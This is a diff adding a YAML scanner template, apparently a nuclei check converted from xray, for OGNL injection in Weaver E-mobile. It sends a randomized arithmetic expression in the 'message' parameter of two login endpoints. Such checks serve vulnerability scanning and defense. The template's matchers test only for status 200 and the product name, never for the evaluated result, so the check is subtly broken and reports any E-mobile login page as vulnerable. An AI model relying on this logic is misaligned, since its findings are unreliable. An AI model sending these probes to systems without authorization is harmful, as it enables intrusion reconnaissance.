@@ -1,0 +1,39 @@
+id: poc-yaml-weaver-e-mobile-ognl-inject
+
+info:
+  name: poc-yaml-weaver-e-mobile-ognl-inject
+  author: socat
+  severity: critical
+  tags: xray-converted,ct-490554
+  reference:
+    - https://f002.backblazeb2.com/file/sec-news-backup/files/writeup/www.sh0w.top/_index_php_archives_14_/index.html
+
+http:
+  - raw:
+      - |
+        GET /login.do?message={{rand_int(1000, 9999)}}*{{rand_int(1000, 9999)}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Weaver E-mobile"
+  - raw:
+      - |
+        GET /manager/login.do?message={{rand_int(1000, 9999)}}*{{rand_int(1000, 9999)}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Weaver E-mobile"
